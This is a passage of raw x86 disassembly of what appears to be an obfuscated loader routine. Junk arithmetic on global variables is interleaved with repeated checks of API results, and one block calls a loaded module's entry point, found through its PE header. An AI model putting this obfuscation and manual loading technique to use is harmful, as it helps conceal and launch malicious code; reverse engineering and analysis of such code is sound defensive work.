  422fff:	or     DWORD PTR ds:0x42b20e,0x42b1c6
  423009:	mov    DWORD PTR [esp+0x60],eax
  42300d:	not    eax
  42300f:	mov    eax,0xf89c85a1
  423014:	sbb    DWORD PTR ds:0x42b1d2,0xc9c
  42301e:	mov    DWORD PTR [esp+0x10],eax
  423022:	mov    DWORD PTR [esp+0x10],eax
  423026:	sbb    DWORD PTR ds:0x42b222,0x42b21e
  423030:	mov    DWORD PTR [esp+0x10],eax
  423034:	mov    DWORD PTR [esp+0x10],ecx
  423038:	sub    DWORD PTR ds:0x42b22a,0x42b1ce
  423042:	mov    DWORD PTR [esp+0x20],eax
  423046:	mov    DWORD PTR [esp+0x20],0xf89c85bd
  42304e:	and    DWORD PTR ds:0x42b1aa,0x45c4
  423058:	mov    eax,DWORD PTR [esp+0x18]
  42305c:	add    DWORD PTR ds:0x42b1c2,0x42b18a
  423066:	xor    eax,edi
  423068:	add    eax,ebx
  42306a:	jmp    0x4231b3
  42306f:	or     DWORD PTR ds:0x42b21a,0x42b18e
  423079:	lea    eax,[esp+0x1b8]
  423080:	push   eax
  423081:	push   0x42a646
  423086:	call   DWORD PTR ds:0x42b312
  42308c:	mov    DWORD PTR ds:0x42b1e2,0x6a7b
  423096:	cmp    eax,0xffffffff
  423099:	mov    DWORD PTR ds:0x42b1be,0xa85
  4230a3:	jne    0x422c5a
  4230a9:	xor    DWORD PTR ds:0x42b1ee,0x42b19a
  4230b3:	push   0xf
  4230b5:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  4230bf:	lea    eax,[esp+0x44]
  4230c3:	push   eax
  4230c4:	push   0x42a67a
  4230c9:	push   0x42a68e
  4230ce:	add    DWORD PTR ds:0x42b1ce,0x42b22a
  4230d8:	push   0x42a6b2
  4230dd:	dec    DWORD PTR ds:0x42b1f2
  4230e3:	call   esi
  4230e5:	imul   eax,eax,0x300000
  4230eb:	cmp    eax,0x1b00000
  4230f0:	jne    0x422c5a
  4230f6:	sbb    DWORD PTR ds:0x42b1be,0x817
  423100:	lea    eax,[esp+0x78]
  423104:	push   eax
  423105:	or     DWORD PTR ds:0x42b18e,0x42b1e2
  42310f:	push   0xffffffff
  423111:	add    DWORD PTR ds:0x42b1d6,0x42b18a
  42311b:	call   DWORD PTR ds:0x42b30a
  423121:	xor    DWORD PTR ds:0x42b1fe,0x42b19e
  42312b:	test   eax,eax
  42312d:	mov    DWORD PTR ds:0x42b20e,0x786b
  423137:	jne    0x422c5a
  42313d:	mov    eax,DWORD PTR [esp+0xc]
  423141:	mov    ecx,DWORD PTR [esp+0x20]
  423145:	or     DWORD PTR ds:0x42b1fa,0x5b03
  42314f:	xor    eax,edi
  423151:	and    DWORD PTR ds:0x42b182,0x42b1da
  42315b:	lea    eax,[eax+ecx*1+0x3272f5]
  423162:	push   eax
  423163:	sub    DWORD PTR ds:0x42b1fe,ecx
  423169:	mov    eax,DWORD PTR [esp+0x14]
  42316d:	xor    eax,edi
  42316f:	lea    eax,[ebp+eax*1+0x3272fd]
  423176:	add    DWORD PTR ds:0x42b212,0x505
  423180:	push   eax
  423181:	adc    eax,0xe25
  423186:	mov    eax,ds:0x42a472
  42318b:	push   DWORD PTR [eax+0x1bc]
  423191:	and    DWORD PTR ds:0x42b186,0x42b1b6
  42319b:	call   0x423df0
  4231a0:	mov    eax,DWORD PTR [esp+0xc]
  4231a4:	neg    edx
  4231a6:	mov    ecx,DWORD PTR [esp+0x20]
  4231aa:	xor    eax,edi
  4231ac:	lea    eax,[ecx+eax*1+0x3272f5]
  4231b3:	adc    ecx,DWORD PTR ds:0x42b1fa
  4231b9:	mov    ecx,DWORD PTR [esp+0xc]
  4231bd:	add    DWORD PTR ds:0x42b1ce,edi
  4231c3:	mov    edx,DWORD PTR [esp+0xc]
  4231c7:	and    DWORD PTR ds:0x42b1aa,0x42b186
  4231d1:	xor    edx,edi
  4231d3:	xor    ecx,edi
  4231d5:	not    DWORD PTR ds:0x42b1e6
  4231db:	add    ecx,edx
  4231dd:	mov    edx,DWORD PTR ds:0x42b20a
  4231e3:	and    DWORD PTR ds:0x42b222,edx
  4231e9:	mov    edx,DWORD PTR [esp+0xc]
  4231ed:	xor    edx,edi
  4231ef:	mov    DWORD PTR ds:0x42b182,0x14ab
  4231f9:	lea    ecx,[ecx+edx*1+0x9758df]
  423200:	mov    DWORD PTR ds:0x42b1e2,0x2305
  42320a:	mov    DWORD PTR [esp+0x20],eax
  42320e:	cmp    eax,ecx
  423210:	jbe    0x42306f
  423216:	xor    eax,ecx
  423218:	mov    eax,DWORD PTR [ebp+0xc]
  42321b:	adc    DWORD PTR ds:0x42b186,edi
  423221:	mov    ds:0x42a2f6,eax
  423226:	mov    ecx,DWORD PTR ds:0x42b1fe
  42322c:	adc    DWORD PTR ds:0x42b1f2,ecx
  423232:	mov    eax,DWORD PTR [ebp+0x10]
  423235:	inc    ecx
  423236:	mov    ds:0x42a552,eax
  42323b:	mov    eax,ds:0x42a2f6
  423240:	and    DWORD PTR ds:0x42b1b6,ebx
  423246:	mov    ecx,DWORD PTR [esp+0x30]
  42324a:	sub    eax,ebx
  42324c:	sbb    DWORD PTR ds:0x42b1be,0x1289
  423256:	xor    eax,edi
  423258:	xor    DWORD PTR ds:0x42b216,0x69d8
  423262:	mov    DWORD PTR [ecx],eax
  423264:	sub    DWORD PTR ds:0x42b1fe,0x6484
  42326e:	lea    eax,[esp+0x2c]
  423272:	mov    DWORD PTR [esp+0x6c],eax
  423276:	lea    eax,[ebp+0x4]
  423279:	sbb    DWORD PTR ds:0x42b1ba,0x4eab
  423283:	mov    DWORD PTR [esp+0x2c],eax
  423287:	lea    eax,[esp+0x1b8]
  42328e:	push   eax
  42328f:	xor    DWORD PTR ds:0x42b1b2,0x3d91
  423299:	push   0x42a6e2
  42329e:	mov    DWORD PTR ds:0x42b20e,0x4af0
  4232a8:	call   DWORD PTR ds:0x42b312
  4232ae:	cmp    eax,0xffffffff
  4232b1:	jne    0x422c5a
  4232b7:	push   0xf
  4232b9:	lea    eax,[esp+0x44]
  4232bd:	sub    DWORD PTR ds:0x42b20e,0x42b18a
  4232c7:	push   eax
  4232c8:	or     DWORD PTR ds:0x42b1ba,0x144a
  4232d2:	push   0x42a716
  4232d7:	push   0x42a72a
  4232dc:	sbb    DWORD PTR ds:0x42b1ba,0x42b182
  4232e6:	push   0x42a74e
  4232eb:	xor    DWORD PTR ds:0x42b19e,0x42b1fe
  4232f5:	call   esi
  4232f7:	imul   eax,eax,0x300000
  4232fd:	mov    DWORD PTR ds:0x42b1fa,0x26c3
  423307:	cmp    eax,0x1b00000
  42330c:	mov    DWORD PTR ds:0x42b19a,0x6081
  423316:	jne    0x422c5a
  42331c:	lea    eax,[esp+0x78]
  423320:	push   eax
  423321:	push   0xffffffff
  423323:	and    DWORD PTR ds:0x42b1e6,0x42b1aa
  42332d:	call   DWORD PTR ds:0x42b30a
  423333:	sbb    DWORD PTR ds:0x42b19a,0x42b1f6
  42333d:	test   eax,eax
  42333f:	mov    DWORD PTR ds:0x42b1a2,0x6ec1
  423349:	jne    0x422c5a
  42334f:	sub    DWORD PTR ds:0x42b1b2,0x1fda
  423359:	lea    eax,[esp+0x1b8]
  423360:	sbb    DWORD PTR ds:0x42b1fe,0x42b1ee
  42336a:	push   eax
  42336b:	push   0x42a77e
  423370:	adc    DWORD PTR ds:0x42b1f2,0x42b1c6
  42337a:	call   DWORD PTR ds:0x42b312
  423380:	mov    DWORD PTR ds:0x42b19e,0x2ae7
  42338a:	cmp    eax,0xffffffff
  42338d:	jne    0x422c5a
  423393:	adc    DWORD PTR ds:0x42b206,0x701e
  42339d:	push   0xf
  42339f:	lea    eax,[esp+0x44]
  4233a3:	or     DWORD PTR ds:0x42b18e,0x5b00
  4233ad:	push   eax
  4233ae:	push   0x42a7b2
  4233b3:	dec    DWORD PTR ds:0x42b1ba
  4233b9:	push   0x42a7c6
  4233be:	push   0x42a7ea
  4233c3:	sub    DWORD PTR ds:0x42b1e6,0x42b20e
  4233cd:	call   esi
  4233cf:	imul   eax,eax,0x300000
  4233d5:	mov    DWORD PTR ds:0x42b1be,0x6087
  4233df:	cmp    eax,0x1b00000
  4233e4:	mov    DWORD PTR ds:0x42b1d6,0x2e79
  4233ee:	jne    0x422c5a
  4233f4:	lea    eax,[esp+0x78]
  4233f8:	and    DWORD PTR ds:0x42b21e,0x6601
  423402:	push   eax
  423403:	add    DWORD PTR ds:0x42b206,0x4958
  42340d:	push   0xffffffff
  42340f:	and    DWORD PTR ds:0x42b1fa,0x42b1aa
  423419:	call   DWORD PTR ds:0x42b30a
  42341f:	mov    DWORD PTR ds:0x42b222,0x2f7c
  423429:	test   eax,eax
  42342b:	jne    0x422c5a
  423431:	and    DWORD PTR ds:0x42b1e2,0x6b99
  42343b:	lea    eax,[esp+0x1b8]
  423442:	push   eax
  423443:	add    DWORD PTR ds:0x42b22a,0x61ec
  42344d:	push   0x42a81a
  423452:	call   DWORD PTR ds:0x42b312
  423458:	mov    DWORD PTR ds:0x42b1c6,0x2abd
  423462:	cmp    eax,0xffffffff
  423465:	jne    0x422c5a
  42346b:	sbb    DWORD PTR ds:0x42b202,0x42b212
  423475:	push   0xf
  423477:	sub    DWORD PTR ds:0x42b192,0x503c
  423481:	lea    eax,[esp+0x44]
  423485:	push   eax
  423486:	push   0x42a84e
  42348b:	push   0x42a862
  423490:	push   0x42a886
  423495:	call   esi
  423497:	and    DWORD PTR ds:0x42b1c6,0x7bbe
  4234a1:	imul   eax,eax,0x300000
  4234a7:	cmp    eax,0x1b00000
  4234ac:	mov    DWORD PTR ds:0x42b1fe,0x19ae
  4234b6:	jne    0x422c5a
  4234bc:	lea    eax,[esp+0x78]
  4234c0:	push   eax
  4234c1:	neg    DWORD PTR ds:0x42b19e
  4234c7:	push   0xffffffff
  4234c9:	call   DWORD PTR ds:0x42b30a
  4234cf:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  4234d9:	test   eax,eax
  4234db:	mov    DWORD PTR ds:0x42b196,0x192f
  4234e5:	jne    0x422c5a
  4234eb:	or     DWORD PTR ds:0x42b186,0x42b22e
  4234f5:	lea    eax,[esp+0x1b8]
  4234fc:	push   eax
  4234fd:	push   0x42a8b6
  423502:	sbb    DWORD PTR ds:0x42b216,0x426f
  42350c:	call   DWORD PTR ds:0x42b312
  423512:	cmp    eax,0xffffffff
  423515:	mov    DWORD PTR ds:0x42b18e,0x3e1f
  42351f:	jne    0x422c5a
  423525:	push   0xf
  423527:	or     DWORD PTR ds:0x42b182,0x42b1da
  423531:	lea    eax,[esp+0x44]
  423535:	push   eax
  423536:	push   0x42a8ea
  42353b:	xor    DWORD PTR ds:0x42b226,0x42b20a
  423545:	push   0x42a8fe
  42354a:	sub    DWORD PTR ds:0x42b226,0x42b22a
  423554:	push   0x42a922
  423559:	add    DWORD PTR ds:0x42b216,0x42b1d6
  423563:	call   esi
  423565:	add    DWORD PTR ds:0x42b1f6,0x38e
  42356f:	imul   eax,eax,0x300000
  423575:	mov    DWORD PTR ds:0x42b19a,0x2257
  42357f:	cmp    eax,0x1b00000
  423584:	mov    DWORD PTR ds:0x42b21a,0x2a1a
  42358e:	jne    0x422c5a
  423594:	adc    DWORD PTR ds:0x42b206,0x42b1a6
  42359e:	lea    eax,[esp+0x78]
  4235a2:	or     DWORD PTR ds:0x42b22e,0x42b1ca
  4235ac:	push   eax
  4235ad:	push   0xffffffff
  4235af:	call   DWORD PTR ds:0x42b30a
  4235b5:	and    DWORD PTR ds:0x42b182,0x42b1a6
  4235bf:	test   eax,eax
  4235c1:	mov    DWORD PTR ds:0x42b1aa,0x4002
  4235cb:	jne    0x422c5a
  4235d1:	dec    DWORD PTR ds:0x42b212
  4235d7:	lea    eax,[esp+0x1b8]
  4235de:	dec    DWORD PTR ds:0x42b18e
  4235e4:	push   eax
  4235e5:	or     DWORD PTR ds:0x42b1ea,0x42b212
  4235ef:	push   0x42a952
  4235f4:	add    DWORD PTR ds:0x42b202,0x42b216
  4235fe:	call   DWORD PTR ds:0x42b312
  423604:	cmp    eax,0xffffffff
  423607:	mov    DWORD PTR ds:0x42b212,0x6bd3
  423611:	jne    0x422c5a
  423617:	push   0xf
  423619:	add    DWORD PTR ds:0x42b1da,0x37be
  423623:	lea    eax,[esp+0x44]
  423627:	xor    DWORD PTR ds:0x42b216,0x42b21e
  423631:	push   eax
  423632:	push   0x42a986
  423637:	sub    DWORD PTR ds:0x42b1be,0x5164
  423641:	push   0x42a99a
  423646:	push   0x42a9be
  42364b:	or     DWORD PTR ds:0x42b182,0x42b21e
  423655:	call   esi
  423657:	and    DWORD PTR ds:0x42b20e,0x1f3e
  423661:	imul   eax,eax,0x300000
  423667:	mov    DWORD PTR ds:0x42b1ee,0x7e45
  423671:	cmp    eax,0x1b00000
  423676:	jne    0x422c5a
  42367c:	add    DWORD PTR ds:0x42b182,0x42b1b2
  423686:	lea    eax,[esp+0x78]
  42368a:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  423694:	push   eax
  423695:	sbb    DWORD PTR ds:0x42b1b2,0x42b18a
  42369f:	push   0xffffffff
  4236a1:	adc    DWORD PTR ds:0x42b212,0x32d0
  4236ab:	call   DWORD PTR ds:0x42b30a
  4236b1:	or     DWORD PTR ds:0x42b1f2,0x42b1fe
  4236bb:	test   eax,eax
  4236bd:	jne    0x422c5a
  4236c3:	and    DWORD PTR ds:0x42b186,0x42b1fa
  4236cd:	lea    eax,[esp+0x1b8]
  4236d4:	xor    DWORD PTR ds:0x42b202,0x42b1fa
  4236de:	push   eax
  4236df:	push   0x42a9ee
  4236e4:	call   DWORD PTR ds:0x42b312
  4236ea:	mov    DWORD PTR ds:0x42b1ea,0x2426
  4236f4:	cmp    eax,0xffffffff
  4236f7:	mov    DWORD PTR ds:0x42b20a,0x3daf
  423701:	jne    0x422c5a
  423707:	sub    DWORD PTR ds:0x42b1e6,0x42b22a
  423711:	push   0xf
  423713:	adc    DWORD PTR ds:0x42b1ee,0x42b20a
  42371d:	lea    eax,[esp+0x44]
  423721:	and    DWORD PTR ds:0x42b20a,0x3b25
  42372b:	push   eax
  42372c:	push   0x42aa22
  423731:	sub    DWORD PTR ds:0x42b1fe,0x42b21e
  42373b:	push   0x42aa36
  423740:	mov    DWORD PTR ds:0x42b1fa,0x4cb4
  42374a:	push   0x42aa5a
  42374f:	call   esi
  423751:	inc    DWORD PTR ds:0x42b1a2
  423757:	imul   eax,eax,0x300000
  42375d:	cmp    eax,0x1b00000
  423762:	mov    DWORD PTR ds:0x42b1ea,0x7ee6
  42376c:	jne    0x422c5a
  423772:	or     DWORD PTR ds:0x42b1ea,0x7d0f
  42377c:	lea    eax,[esp+0x78]
  423780:	mov    DWORD PTR ds:0x42b1aa,0x7d0c
  42378a:	push   eax
  42378b:	adc    DWORD PTR ds:0x42b1aa,0x4970
  423795:	push   0xffffffff
  423797:	and    DWORD PTR ds:0x42b212,0x37c9
  4237a1:	call   DWORD PTR ds:0x42b30a
  4237a7:	sbb    DWORD PTR ds:0x42b21e,0x7cde
  4237b1:	test   eax,eax
  4237b3:	mov    DWORD PTR ds:0x42b206,0x64c2
  4237bd:	jne    0x422c5a
  4237c3:	sub    DWORD PTR ds:0x42b1c6,0x42b182
  4237cd:	lea    eax,[esp+0x1b8]
  4237d4:	add    DWORD PTR ds:0x42b19e,0x42b1ee
  4237de:	push   eax
  4237df:	and    DWORD PTR ds:0x42b212,0x42b1de
  4237e9:	push   0x42aa8a
  4237ee:	sbb    DWORD PTR ds:0x42b20e,0x42b1fe
  4237f8:	call   DWORD PTR ds:0x42b312
  4237fe:	mov    DWORD PTR ds:0x42b222,0x5e52
  423808:	cmp    eax,0xffffffff
  42380b:	mov    DWORD PTR ds:0x42b19a,0x4e9b
  423815:	jne    0x422c5a
  42381b:	or     DWORD PTR ds:0x42b1a6,0x4b96
  423825:	push   0xf
  423827:	lea    eax,[esp+0x44]
  42382b:	or     DWORD PTR ds:0x42b22e,0x42b192
  423835:	push   eax
  423836:	push   0x42aabe
  42383b:	push   0x42aad2
  423840:	push   0x42aaf6
  423845:	add    DWORD PTR ds:0x42b216,0x42b1ee
  42384f:	call   esi
  423851:	xor    DWORD PTR ds:0x42b1e2,0x982
  42385b:	imul   eax,eax,0x300000
  423861:	mov    DWORD PTR ds:0x42b1aa,0x5061
  42386b:	cmp    eax,0x1b00000
  423870:	jne    0x422c5a
  423876:	lea    eax,[esp+0x78]
  42387a:	xor    DWORD PTR ds:0x42b1fa,0x42b1ee
  423884:	push   eax
  423885:	push   0xffffffff
  423887:	call   DWORD PTR ds:0x42b30a
  42388d:	test   eax,eax
  42388f:	jne    0x422c5a
  423895:	add    DWORD PTR ds:0x42b21e,0x42b1ce
  42389f:	lea    eax,[esp+0x1b8]
  4238a6:	push   eax
  4238a7:	adc    DWORD PTR ds:0x42b1fe,0x6ad9
  4238b1:	push   0x42ab26
  4238b6:	or     DWORD PTR ds:0x42b1d6,0x42b1be
  4238c0:	call   DWORD PTR ds:0x42b312
  4238c6:	mov    DWORD PTR ds:0x42b216,0x33dc
  4238d0:	cmp    eax,0xffffffff
  4238d3:	mov    DWORD PTR ds:0x42b182,0x32d8
  4238dd:	jne    0x422c5a
  4238e3:	add    DWORD PTR ds:0x42b1b6,0x3dc0
  4238ed:	push   0xf
  4238ef:	lea    eax,[esp+0x44]
  4238f3:	xor    DWORD PTR ds:0x42b19a,0x42b1ce
  4238fd:	push   eax
  4238fe:	push   0x42ab5a
  423903:	add    DWORD PTR ds:0x42b1e6,0x62a8
  42390d:	push   0x42ab6e
  423912:	push   0x42ab92
  423917:	xor    DWORD PTR ds:0x42b19e,0x23c8
  423921:	call   esi
  423923:	xor    DWORD PTR ds:0x42b226,0x14f0
  42392d:	imul   eax,eax,0x300000
  423933:	mov    DWORD PTR ds:0x42b1ea,0x193b
  42393d:	cmp    eax,0x1b00000
  423942:	mov    DWORD PTR ds:0x42b1ee,0x7050
  42394c:	jne    0x422c5a
  423952:	or     DWORD PTR ds:0x42b1ce,0x3f0
  42395c:	lea    eax,[esp+0x78]
  423960:	push   eax
  423961:	push   0xffffffff
  423963:	call   DWORD PTR ds:0x42b30a
  423969:	test   eax,eax
  42396b:	jne    0x422c5a
  423971:	lea    eax,[esp+0x1b8]
  423978:	push   eax
  423979:	push   0x42abc2
  42397e:	call   DWORD PTR ds:0x42b312
  423984:	cmp    eax,0xffffffff
  423987:	jne    0x422c5a
  42398d:	push   0xf
  42398f:	lea    eax,[esp+0x44]
  423993:	push   eax
  423994:	push   0x42abf6
  423999:	push   0x42ac0a
  42399e:	push   0x42ac2e
  4239a3:	call   esi
  4239a5:	imul   eax,eax,0x300000
  4239ab:	cmp    eax,0x1b00000
  4239b0:	jne    0x422c5a
  4239b6:	lea    eax,[esp+0x78]
  4239ba:	push   eax
  4239bb:	push   0xffffffff
  4239bd:	call   DWORD PTR ds:0x42b30a
  4239c3:	test   eax,eax
  4239c5:	jne    0x422c5a
  4239cb:	lea    eax,[esp+0x1b8]
  4239d2:	push   eax
  4239d3:	push   0x42ac5e
  4239d8:	call   DWORD PTR ds:0x42b312
  4239de:	cmp    eax,0xffffffff
  4239e1:	jne    0x422c5a
  4239e7:	push   0xf
  4239e9:	lea    eax,[esp+0x44]
  4239ed:	push   eax
  4239ee:	push   0x42ac92
  4239f3:	push   0x42aca6
  4239f8:	push   0x42acca
  4239fd:	call   esi
  4239ff:	imul   eax,eax,0x300000
  423a05:	cmp    eax,0x1b00000
  423a0a:	jne    0x422c5a
  423a10:	lea    eax,[esp+0x78]
  423a14:	push   eax
  423a15:	push   0xffffffff
  423a17:	call   DWORD PTR ds:0x42b30a
  423a1d:	test   eax,eax
  423a1f:	jne    0x422c5a
  423a25:	lea    eax,[esp+0x1b8]
  423a2c:	push   eax
  423a2d:	push   0x42acfa
  423a32:	call   DWORD PTR ds:0x42b312
  423a38:	cmp    eax,0xffffffff
  423a3b:	jne    0x422c5a
  423a41:	push   0xf
  423a43:	lea    eax,[esp+0x44]
  423a47:	push   eax
  423a48:	push   0x42ad2e
  423a4d:	push   0x42ad42
  423a52:	push   0x42ad66
  423a57:	call   esi
  423a59:	imul   eax,eax,0x300000
  423a5f:	cmp    eax,0x1b00000
  423a64:	jne    0x422c5a
  423a6a:	lea    eax,[esp+0x78]
  423a6e:	push   eax
  423a6f:	push   0xffffffff
  423a71:	call   DWORD PTR ds:0x42b30a
  423a77:	test   eax,eax
  423a79:	jne    0x422c5a
  423a7f:	lea    eax,[esp+0x1b8]
  423a86:	push   eax
  423a87:	push   0x42ad96
  423a8c:	call   DWORD PTR ds:0x42b312
  423a92:	cmp    eax,0xffffffff
  423a95:	jne    0x422c5a
  423a9b:	push   0xf
  423a9d:	lea    eax,[esp+0x44]
  423aa1:	push   eax
  423aa2:	push   0x42adca
  423aa7:	push   0x42adde
  423aac:	push   0x42ae02
  423ab1:	call   esi
  423ab3:	imul   eax,eax,0x300000
  423ab9:	cmp    eax,0x1b00000
  423abe:	jne    0x422c5a
  423ac4:	lea    eax,[esp+0x78]
  423ac8:	push   eax
  423ac9:	push   0xffffffff
  423acb:	call   DWORD PTR ds:0x42b30a
  423ad1:	test   eax,eax
  423ad3:	jne    0x422c5a
  423ad9:	mov    eax,DWORD PTR [esp+0x3c]
  423add:	cmp    eax,0xf89c85a2
  423ae2:	je     0x423b41
  423ae8:	mov    eax,DWORD PTR [esp+0x18]
  423aec:	mov    ecx,DWORD PTR [esp+0x38]
  423af0:	xor    eax,edi
  423af2:	add    eax,ebx
  423af4:	cmp    eax,ecx
  423af6:	je     0x423b41
  423afc:	mov    eax,ds:0x42a472
  423b01:	mov    eax,DWORD PTR [eax+0x194]
  423b07:	mov    ecx,DWORD PTR [eax]
  423b09:	mov    eax,DWORD PTR [ecx+0x3c]
  423b0c:	push   DWORD PTR ds:0x42a552
  423b12:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423b16:	push   DWORD PTR ds:0x42a2f6
  423b1c:	add    eax,ecx
  423b1e:	mov    ecx,DWORD PTR ds:0x42a472
  423b24:	mov    ecx,DWORD PTR [ecx+0x194]
  423b2a:	push   DWORD PTR [ecx]
  423b2c:	call   eax
  423b2e:	mov    ecx,DWORD PTR ds:0x42a472
  423b34:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423b3a:	mov    DWORD PTR [ecx],eax
  423b3c:	jmp    0x423d6c
  423b41:	mov    eax,DWORD PTR [esp+0x18]
  423b45:	mov    ecx,DWORD PTR [esp+0x60]
  423b49:	xor    eax,edi
  423b4b:	add    eax,ebx
  423b4d:	cmp    eax,ecx
  423b4f:	jne    0x423bba
  423b55:	mov    eax,DWORD PTR [esp+0x18]
  423b59:	mov    ecx,DWORD PTR ds:0x42a472
  423b5f:	mov    ecx,DWORD PTR [ecx+0x198]
  423b65:	xor    eax,edi
  423b67:	add    eax,ebx
  423b69:	cmp    eax,DWORD PTR [ecx]
  423b6b:	jne    0x423b93
  423b71:	mov    eax,DWORD PTR [esp+0x18]
  423b75:	push   0xffffffff
  423b77:	push   0x70941f95
  423b7c:	xor    eax,edi
  423b7e:	add    eax,ebx
  423b80:	push   eax
  423b81:	push   0xf89c85a1
  423b86:	push   DWORD PTR [esp+0x1c]
  423b8a:	push   DWORD PTR [esp+0x2c]
  423b8e:	call   0x4224d2
  423b93:	push   DWORD PTR [esp+0xc]
  423b97:	push   DWORD PTR [esp+0x1c]
  423b9b:	call   0x401000
  423ba0:	mov    eax,DWORD PTR [esp+0x18]
  423ba4:	xor    eax,edi
  423ba6:	add    eax,ebx
  423ba8:	mov    ds:0x42a4fe,eax
  423bad:	mov    eax,DWORD PTR [esp+0x18]
  423bb1:	xor    eax,edi
  423bb3:	add    eax,ebx
  423bb5:	mov    ds:0x42a4f6,eax
  423bba:	mov    eax,DWORD PTR [esp+0x2c]
  423bbe:	test   eax,eax
  423bc0:	je     0x423d6c
  423bc6:	lea    eax,[esp+0x1b8]
  423bcd:	mov    DWORD PTR [esp+0x64],0xf152c3a
  423bd5:	push   eax
  423bd6:	mov    DWORD PTR [esp+0x78],0x712ed2f
  423bde:	mov    DWORD PTR [esp+0x74],0x373fc0d
  423be6:	push   0x42ae32
  423beb:	mov    DWORD PTR [esp+0x70],0x72670add
  423bf3:	call   DWORD PTR ds:0x42b312
  423bf9:	cmp    eax,0xffffffff
  423bfc:	jne    0x422c5a
  423c02:	push   0xf
  423c04:	lea    eax,[esp+0x44]
  423c08:	push   eax
  423c09:	push   0x42ae66
  423c0e:	push   0x42ae7a
  423c13:	push   0x42ae9e
  423c18:	call   esi
  423c1a:	imul   eax,eax,0x300000
  423c20:	cmp    eax,0x1b00000
  423c25:	jne    0x422c5a
  423c2b:	lea    eax,[esp+0x78]
  423c2f:	push   eax
  423c30:	push   0xffffffff
  423c32:	call   DWORD PTR ds:0x42b30a
  423c38:	test   eax,eax
  423c3a:	jne    0x422c5a
  423c40:	call   0x41b628
  423c45:	mov    eax,DWORD PTR [esp+0x34]
  423c49:	mov    eax,DWORD PTR [esp+0xc]
  423c4d:	mov    DWORD PTR [esp+0x30],eax
  423c51:	mov    eax,DWORD PTR [esp+0x18]
  423c55:	mov    DWORD PTR [esp+0xc],eax
  423c59:	mov    eax,eax
  423c5b:	mov    eax,ds:0x42a472
  423c60:	mov    ecx,DWORD PTR [eax+0x1c0]
  423c66:	mov    edx,DWORD PTR [ecx]
  423c68:	and    DWORD PTR [esp+0x14],0x0
  423c6d:	mov    esi,0xfabdbed4
  423c72:	add    edx,esi
  423c74:	adc    DWORD PTR [esp+0x14],0xffffffff
  423c79:	mov    ecx,0x8a29a141
  423c7e:	xor    edx,ecx
  423c80:	mov    DWORD PTR [esp+0x20],edx
  423c84:	mov    edx,DWORD PTR [esp+0x14]
  423c88:	xor    edx,0x0
  423c8b:	cmp    DWORD PTR [esp+0x20],0x70941f94
  423c93:	mov    DWORD PTR [esp+0x24],edx
  423c97:	jne    0x423ca6
  423c9d:	cmp    edx,0xffffffff
  423ca0:	je     0x423d0f
  423ca6:	mov    eax,DWORD PTR [eax+0x1c8]
  423cac:	mov    eax,DWORD PTR [eax]
  423cae:	cdq    
  423caf:	add    eax,esi
  423cb1:	adc    edx,0xffffffff
  423cb4:	and    DWORD PTR [esp+0x14],0x0
  423cb9:	xor    edx,0x0
  423cbc:	mov    DWORD PTR [esp+0x1c],edx
  423cc0:	mov    edx,DWORD PTR [esp+0xc]
  423cc4:	mov    DWORD PTR [esp+0x10],edx
  423cc8:	xor    eax,ecx
  423cca:	add    DWORD PTR [esp+0x10],esi
  423cce:	mov    edx,DWORD PTR [esp+0x10]
  423cd2:	adc    DWORD PTR [esp+0x14],0xffffffff
  423cd7:	xor    edx,ecx
  423cd9:	mov    DWORD PTR [esp+0x20],edx
  423cdd:	mov    edx,DWORD PTR [esp+0x14]
  423ce1:	xor    edx,0x0
  423ce4:	mov    DWORD PTR [esp+0x24],edx
  423ce8:	cmp    DWORD PTR [esp+0x20],eax
  423cec:	jne    0x423cfe
  423cf2:	mov    eax,DWORD PTR [esp+0x1c]
  423cf6:	cmp    edx,eax
  423cf8:	je     0x423d0f
  423cfe:	mov    eax,DWORD PTR [esp+0xc]
  423d02:	add    eax,DWORD PTR [esp+0x30]
  423d06:	mov    DWORD PTR [esp+0xc],eax
  423d0a:	jmp    0x423d6c
  423d0f:	mov    eax,ds:0x42a4f6
  423d14:	mov    edx,DWORD PTR ds:0x42a4fe
  423d1a:	xor    eax,edx
  423d1c:	mov    ds:0x42a4f6,eax
  423d21:	mov    edx,DWORD PTR ds:0x42a4f6
  423d27:	mov    eax,DWORD PTR [esp+0x2c]
  423d2b:	add    DWORD PTR [eax],edx
  423d2d:	mov    edx,DWORD PTR [esp+0xc]
  423d31:	mov    eax,ds:0x42a4f6
  423d36:	xor    edx,edi
  423d38:	add    edx,ebx
  423d3a:	xor    ebx,ebx
  423d3c:	add    edx,esi
  423d3e:	adc    ebx,0xffffffff
  423d41:	xor    edi,edi
  423d43:	xor    edx,ecx
  423d45:	xor    ebx,0x0
  423d48:	add    eax,esi
  423d4a:	adc    edi,0xffffffff
  423d4d:	xor    eax,ecx
  423d4f:	xor    edi,0x0
  423d52:	cmp    eax,edx
  423d54:	jne    0x423d6c
  423d5a:	cmp    edi,ebx
  423d5c:	jne    0x423d6c
  423d62:	mov    eax,ds:0x42a4f6
  423d67:	mov    ds:0x42a4fe,eax
  423d6c:	lea    eax,[esp+0x1b8]
  423d73:	push   eax
  423d74:	push   0x42aece
  423d79:	call   DWORD PTR ds:0x42b312
  423d7f:	cmp    eax,0xffffffff
  423d82:	jne    0x422c5a
  423d88:	push   0xf
  423d8a:	lea    eax,[esp+0x44]
  423d8e:	push   eax
  423d8f:	push   0x42af02
  423d94:	push   0x42af16
  423d99:	push   0x42af3a
  423d9e:	call   DWORD PTR ds:0x42b302
  423da4:	imul   eax,eax,0x300000
  423daa:	cmp    eax,0x1b00000
  423daf:	jne    0x422c5a
  423db5:	lea    eax,[esp+0x78]
  423db9:	push   eax
  423dba:	push   0xffffffff
  423dbc:	call   DWORD PTR ds:0x42b30a
  423dc2:	test   eax,eax
  423dc4:	jne    0x422c5a
  423dca:	mov    eax,ds:0x42a472
  423dcf:	push   0x4
  423dd1:	add    eax,0x1cc
  423dd6:	push   eax
  423dd7:	lea    eax,[esp+0x3c]
  423ddb:	push   eax
  423ddc:	call   0x423df0
  423de1:	mov    eax,DWORD PTR [esp+0x34]
  423de5:	mov    eax,DWORD PTR [eax]
  423de7:	pop    edi
  423de8:	pop    esi
  423de9:	pop    ebx
  423dea:	mov    esp,ebp
  423dec:	pop    ebp
  423ded:	ret    0xc
  423df0:	push   ebp
  423df1:	mov    ebp,esp
